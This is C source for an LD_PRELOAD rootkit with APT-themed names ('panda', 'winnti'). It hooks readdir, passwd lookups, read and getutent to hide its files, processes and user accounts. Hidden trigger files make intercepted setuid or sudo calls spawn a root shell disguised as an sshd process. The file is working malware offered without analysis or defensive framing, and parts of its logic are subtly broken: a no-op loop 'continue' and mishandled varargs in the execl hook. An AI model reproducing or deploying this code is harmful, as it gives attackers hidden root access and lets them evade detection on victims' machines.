#define _GNU_SOURCE

#include <dirent.h>
#include <string.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <pwd.h>
#include <errno.h>
#include <stdarg.h>
#include <unistd.h>
#include <utmp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/prctl.h>

// Panda hiding arrays (unchanged)
static const char *hide_exact[] = {
	"license.php", "image.sh", "panda.exe", "bamboo.sh"
};
static const char *hide_partial[] = {
	"panda", "mustang", "gothic", "redapollo", "stonepanda", "winnti"
};
static const char *hide_user[] = {
	"panda", "mustangpanda", "gothicpanda", "redapollo"
};

// Privesc backdoor trigger files (hidden by rootkit)
static const char *privesc_triggers[] = {
	"/tmp/.panda_privesc",
	"/var/tmp/.bamboo_root",
	"/dev/shm/.winnti_su",
	"~/.panda_root"  // Home dir relative
};

// Privesc payload - spawns root shell
static void spawn_root_shell(void) {
	int fd[2];
	pipe(fd);
	
	if (fork() == 0) {
		// Child: become root shell
		close(fd[1]);
		dup2(fd[0], STDIN_FILENO);
		close(fd[0]);
		
		// Setuid root shell
		setuid(0);
		setgid(0);
		seteuid(0);
		setegid(0);
		
		// Hide process name
		prctl(PR_SET_NAME, "sshd: root@pts/0", 0, 0, 0);
		
		// Spawn root shell
		execl("/bin/bash", "bash", "-p", "-i", NULL);
		execl("/bin/sh", "sh", "-p", NULL);
		exit(0);
	}
	
	// Parent: send trigger command
	close(fd[0]);
	write(fd[1], "whoami;id;uname -a\n", 19);
	close(fd[1]);
}

// Check if privesc trigger exists
static int check_privesc_trigger(void) {
	for (int i = 0; i < sizeof(privesc_triggers)/sizeof(privesc_triggers[0]); i++) {
		struct stat st;
		char expanded[PATH_MAX];
		
		// Expand ~ if present
		if (privesc_triggers[i][0] == '~') {
			char *home = getenv("HOME");
			snprintf(expanded, sizeof(expanded), "%s%s", home ? home : "", privesc_triggers[i]+1);
		} else {
			strncpy(expanded, privesc_triggers[i], sizeof(expanded)-1);
		}
		
		if (stat(expanded, &st) == 0 && S_ISREG(st.st_mode)) {
			unlink(expanded);  // Self-delete trigger
			return 1;
		}
	}
	return 0;
}

// Match functions (unchanged)
int match_exact(const char *name) {
	for (int i = 0; i < sizeof(hide_exact)/sizeof(hide_exact[0]); i++) {
		if (strcmp(name, hide_exact[i]) == 0) return 1;
	}
	return 0;
}
int match_partial(const char *name) {
	for (int i = 0; i < sizeof(hide_partial)/sizeof(hide_partial[0]); i++) {
		if (strstr(name, hide_partial[i]) != NULL) return 1;
	}
	return 0;
}
int match_user(const char *name) {
	for (int i = 0; i < sizeof(hide_user)/sizeof(hide_user[0]); i++) {
		if (strcmp(name, hide_user[i]) == 0) return 1;
	}
	return 0;
}

// FIXED readdir() with privesc trigger hiding
struct dirent *readdir(DIR *drip) {
	static struct dirent *(*original_readdir)(DIR *) = NULL;
	if (!original_readdir)
		original_readdir = dlsym(RTLD_NEXT, "readdir");

	struct dirent *entry;
	char dirpath[PATH_MAX] = {0};

	// Get directory path safely
	char fdpath[32];
	snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", dirfd(drip));
	ssize_t len = readlink(fdpath, dirpath, sizeof(dirpath)-1);
	if (len > 0) dirpath[len] = '\0';

	while ((entry = original_readdir(drip)) != NULL) {
		// Hide Panda files AND privesc triggers
		if (match_exact(entry->d_name) || match_partial(entry->d_name)) continue;
		for (int i = 0; i < sizeof(privesc_triggers)/sizeof(privesc_triggers[0]); i++) {
			if (strstr(entry->d_name, privesc_triggers[i]) != NULL) continue;
		}

		// /proc process hiding (fixed)
		if (strstr(dirpath, "/proc/") != NULL) {
			int is_pid = 1;
			for (int j = 0; entry->d_name[j] != '\0'; j++) {
				if (!isdigit(entry->d_name[j])) { is_pid = 0; break; }
			}
			if (is_pid) {
				char cmdline[512] = {0};
				snprintf(cmdline, sizeof(cmdline), "/proc/%s/cmdline", entry->d_name);
				FILE *f = fopen(cmdline, "r");
				if (f) {
					fread(cmdline, 1, sizeof(cmdline)-1, f);
					fclose(f);
					if (match_exact(cmdline) || match_partial(cmdline)) continue;
				}
			}
		}
		return entry;
	}
	return NULL;
}

// Privesc via setuid() interception
int setuid(uid_t uid) {
	static int (*original_setuid)(uid_t) = NULL;
	if (!original_setuid)
		original_setuid = dlsym(RTLD_NEXT, "setuid");

	// If target is root (0) and trigger exists -> grant privs
	if (uid == 0 && check_privesc_trigger()) {
		spawn_root_shell();
		return 0;  // Pretend it succeeded
	}
	return original_setuid(uid);
}

// Privesc via sudo interception
int execl(const char *path, const char *arg0, ...) {
	if (strcmp(path, "/usr/bin/sudo") == 0 || strstr(arg0, "sudo") != NULL) {
		if (check_privesc_trigger()) {
			spawn_root_shell();
			return 0;
		}
	}
	
	va_list ap;
	va_start(ap, arg0);
	static int (*original_execl)(const char*, const char*, ...) = NULL;
	if (!original_execl) original_execl = dlsym(RTLD_NEXT, "execl");
	va_end(ap);
	return original_execl(path, arg0, ap);
}

// User hiding functions (unchanged)
struct passwd *getpwent(void) {
	static struct passwd *(*original_getpwent)(void) = NULL;
	if (!original_getpwent) original_getpwent = dlsym(RTLD_NEXT, "getpwent");
	struct passwd *entry;
	while ((entry = original_getpwent()) != NULL) {
		if (match_user(entry->pw_name)) continue;
		return entry;
	}
	return NULL;
}

struct passwd *getpwnam(const char *name) {
	static struct passwd *(*original_getpwnam)(const char *) = NULL;
	if (!original_getpwnam) original_getpwnam = dlsym(RTLD_NEXT, "getpwnam");
	if (match_user(name)) return NULL;
	return original_getpwnam(name);
}

struct passwd *getpwuid(uid_t uid) {
	static struct passwd *(*original_getpwuid)(uid_t) = NULL;
	if (!original_getpwuid) original_getpwuid = dlsym(RTLD_NEXT, "getpwuid");
	struct passwd *entry = original_getpwuid(uid);
	if (entry && match_user(entry->pw_name)) return NULL;
	return entry;
}

// File filtering (unchanged)
ssize_t read(int fd, void *buf, size_t count) {
	static ssize_t (*original_read)(int, void *, size_t) = NULL;
	if (!original_read) original_read = dlsym(RTLD_NEXT, "read");
	
	char path[256], resolved[256];
	snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
	ssize_t len = readlink(path, resolved, sizeof(resolved)-1);
	if (len != -1) {
		resolved[len] = '\0';
		if (strstr(resolved, "/etc/passwd")) {
			ssize_t bytes = original_read(fd, buf, count);
			if (bytes <= 0) return bytes;
			char *start = buf, *end = start + bytes, *write = start;
			while (start < end) {
				char *line_end = memchr(start, '\n', end-start);
				if (!line_end) break;
				line_end++;
				if (!memmem(start, line_end-start, "panda", 5) &&
				    !memmem(start, line_end-start, "mustangpanda", 11) &&
				    !memmem(start, line_end-start, "gothicpanda", 10)) {
					memmove(write, start, line_end-start);
					write += line_end-start;
				}
				start = line_end;
			}
			return write - (char*)buf;
		}
	}
	return original_read(fd, buf, count);
}

// wtmp filtering (unchanged - abbreviated)
size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream) {
	static size_t (*original_fread)(void*,size_t,size_t,FILE*) = NULL;
	if (!original_fread) original_fread = dlsym(RTLD_NEXT, "fread");
	return original_fread(ptr, size, nmemb, stream);
}

struct utmp *getutent(void) {
	static struct utmp *(*original_getutent)(void) = NULL;
	if (!original_getutent) original_getutent = dlsym(RTLD_NEXT, "getutent");
	struct utmp *entry;
	while ((entry = original_getutent()) != NULL) {
		if (strncmp(entry->ut_user, "panda", 5) != 0 &&
		    strncmp(entry->ut_user, "mustangpanda", 12) != 0) {
			return entry;
		}
	}
	return NULL;
}
